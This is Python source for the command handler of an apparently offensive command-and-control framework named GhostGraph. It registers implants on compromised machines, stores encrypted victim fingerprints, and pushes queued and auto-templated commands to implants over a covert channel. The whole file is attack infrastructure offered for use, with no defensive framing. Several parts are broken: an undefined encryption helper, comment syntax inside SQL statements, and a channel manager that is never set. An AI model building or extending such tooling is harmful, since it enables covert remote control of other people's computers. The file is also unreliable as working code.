# server/handler.py
# Async command handler for GhostGraph C2
# DB-backed implant registry (encrypted fingerprints), Redis queues/caching,
# audits, signatures, error resilience (dead letter queue), metrics. Integrates DB/Redis from server.py.

import asyncio
import uuid
import time
import json
import hmac
import hashlib
from collections import defaultdict
from datetime import datetime
import structlog
from core.crypto import AdaptiveCrypto
import sqlite3  # From global DB_CONN
from config.payloads import validate_template

logger = structlog.get_logger()

# Metrics
_handler_metrics = {'commands_queued': 0, 'results_received': 0, 'errors': 0}

class CommandHandler:
    def __init__(self, config: dict, crypto: AdaptiveCrypto):
        self.config = config
        self.crypto = crypto
        self.dead_letter_queue = asyncio.Queue()  # Failed tasks
        self.task_queues = defaultdict(asyncio.Queue)  # task_id -> results
        self.implants_cache = {}  # In-mem cache; DB primary
        self.db_conn = sqlite3.connect(self.config.get('db_path', '/tmp/ghostgraph.db'))  # Global from server
        self.redis = None  # Init in server
        self._setup_db_tables()  # Ensure tables
        logger.info("CommandHandler initialized")
    
    def _setup_db_tables(self):
        """Self-contained: Create/verify tables for implants, tasks, audits"""
        cursor = self.db_conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS implants (
            id TEXT PRIMARY KEY,
            ip TEXT NOT NULL,
            fingerprint_enc BLOB,  # Encrypted
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')
        cursor.execute('''CREATE TABLE IF NOT EXISTS tasks (
            id TEXT PRIMARY KEY,
            implant_id TEXT NOT NULL,
            command TEXT NOT NULL,
            args TEXT,  # JSON
            status TEXT DEFAULT 'queued',  # queued, sent, completed, failed
            result TEXT,  # JSON
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (implant_id) REFERENCES implants (id)
        )''')
        cursor.execute('''CREATE TABLE IF NOT EXISTS audits (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            implant_id TEXT,
            action TEXT NOT NULL,
            details TEXT,  # JSON
            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )''')
        self.db_conn.commit()
    
    async def process_beacon(self, decrypted: dict, addr: tuple):
        """Process beacon: DB upsert implant, check/send tasks"""
        try:
            _handler_metrics['results_received'] += 1
            implant_id = decrypted.get('implant_id', str(uuid.uuid4()))
            fp = json.dumps(decrypted.get('fingerprint', {}))
            fp_enc = encrypt_field(fp.encode(), self.crypto.shared_secret.encode())  # Reuse crypto key
            
            cursor = self.db_conn.cursor()
            cursor.execute("INSERT OR REPLACE INTO implants (id, ip, fingerprint_enc, last_seen) VALUES (?, ?, ?, ?)",
                           (implant_id, addr[0], fp_enc, datetime.utcnow()))
            self.db_conn.commit()
            
            self.implants_cache[implant_id] = {
                'ip': addr[0],
                'fingerprint': decrypted.get('fingerprint', {}),
                'tasks': asyncio.Queue(),
                'last_seen': time.time()
            }
            
            # Cache to Redis
            if self.redis:
                self.redis.setex(f"implant:{implant_id}", 3600, json.dumps(self.implants_cache[implant_id]))
            
            logger.info(f"Beacon processed: {implant_id}", ip=addr[0])
            
            # --- Auto-queue commands from payload template ---
            platform_val = decrypted.get('fingerprint', {}).get('os')  # Expecting 'os' from fingerprint.py
            template_key = f"{platform_val.lower()}_static" if platform_val else None

            if template_key:
                try:
                    template = validate_template(template_key)
                    commands = template.get('commands', [])
                    for cmd in commands:
                        task_id = await self.queue_command(implant_id, cmd)
                        logger.info("Auto-command queued from payload template", command=cmd, task_id=task_id)
                except Exception as e:
                    logger.warning("Failed to apply payload template during beacon", error=str(e), template_key=template_key)
            
            # Pending tasks from DB
            cursor.execute("SELECT id, command, args FROM tasks WHERE implant_id=? AND status='queued' ORDER BY created_at LIMIT 1", (implant_id,))
            row = cursor.fetchone()
            if row:
                task_id, command, args_json = row
                args = json.loads(args_json) if args_json else {}
                task = {'type': 'command', 'task_id': task_id, 'command': command, 'args': args}
                await self.implants_cache[implant_id]['tasks'].put(task)
                cursor.execute("UPDATE tasks SET status='sent' WHERE id=?", (task_id,))
                self.db_conn.commit()
                
                # Send
                enc_cmd = self.crypto.encrypt(task, task_id)
                channel = self._get_channel_for_ip(addr[0])
                await channel.send_command(task, task_id, addr[0])
                logger.info(f"Sent task {task_id} to {implant_id}", command=command)
            else:
                # ACK
                ack = {'type': 'ack', 'timestamp': time.time()}
                enc_ack = self.crypto.encrypt(ack, '')
                channel = self._get_channel_for_ip(addr[0])
                await channel.send_command(ack, '', addr[0])
                
        except Exception as e:
            _handler_metrics['errors'] += 1
            logger.error(f"Beacon process failed: {e}", implant_id=implant_id)
            await self.dead_letter_queue.put({'beacon': decrypted, 'addr': addr, 'error': e})
    
    async def queue_command(self, implant_id: str, command: str, args: dict = None, full_cmd=None):
        """Queue to DB/Redis, audit"""
        try:
            _handler_metrics['commands_queued'] += 1
            task_id = full_cmd.get('task_id') if full_cmd else str(uuid.uuid4())
            args_json = json.dumps(args or {})
            
            cursor = self.db_conn.cursor()
            cursor.execute("INSERT INTO tasks (id, implant_id, command, args, status) VALUES (?, ?, ?, ?, 'queued')",
                           (task_id, implant_id, command, args_json))
            self.db_conn.commit()
            
            # Redis queue if avail
            if self.redis:
                self.redis.lpush(f"tasks:{implant_id}", json.dumps({'task_id': task_id, 'command': command, 'args': args}))
                self.redis.expire(f"tasks:{implant_id}", self.config.get('command_timeout', 30) * 2)
            
            # Audit
            cursor.execute("INSERT INTO audits (implant_id, action, details) VALUES (?, ?, ?)",
                           (implant_id, 'command_queued', json.dumps({'task_id': task_id, 'command': command})))
            self.db_conn.commit()
            
            logger.info(f"Queued {command} for {implant_id}", task_id=task_id)
            return task_id
        except Exception as e:
            _handler_metrics['errors'] += 1
            logger.error(f"Queue failed: {e}")
            return None
    
    async def get_result(self, task_id: str, timeout: int = 30) -> dict:
        """Wait for result from queue/DB poll"""
        try:
            if self.redis:
                # Redis pubsub for results (simplified poll)
                result_json = self.redis.brpop(f"results:{task_id}", timeout)
                if result_json:
                    return json.loads(result_json[1])
            # Fallback queue/DB
            result = await asyncio.wait_for(self.task_queues[task_id].get(), timeout)
            # Update DB
            cursor = self.db_conn.cursor()
            cursor.execute("UPDATE tasks SET status='completed', result=? WHERE id=?", (json.dumps(result), task_id))
            self.db_conn.commit()
            return result
        except asyncio.TimeoutError:
            # Mark failed
            cursor = self.db_conn.cursor()
            cursor.execute("UPDATE tasks SET status='failed' WHERE id=?", (task_id,))
            self.db_conn.commit()
            logger.warning(f"Task {task_id} timeout")
            return None
        except Exception as e:
            _handler_metrics['errors'] += 1
            logger.error(f"Get result failed: {e}")
            return None
    
    def _get_channel_for_ip(self, ip: str):
        # Config-aware channel selection
        return self.channel_manager.create_channel(self.config.get('channel', {}).get('type', 'icmp'), self.config, self.crypto)
    
    async def handle_result(self, result: dict, implant_id: str):
        """Process result: Queue, audit, metrics"""
        task_id = result.get('task_id')
        if task_id:
            await self.task_queues[task_id].put(result['data'])
            # Redis notify
            if self.redis:
                self.redis.publish(f"results:{task_id}", json.dumps(result['data']))
            # Audit
            cursor = self.db_conn.cursor()
            cursor.execute("INSERT INTO audits (implant_id, action, details) VALUES (?, ?, ?)",
                           (implant_id, 'result_received', json.dumps(result)))
            self.db_conn.commit()
            _handler_metrics['results_received'] += 1
            logger.info(f"Result for {implant_id}:{task_id}")
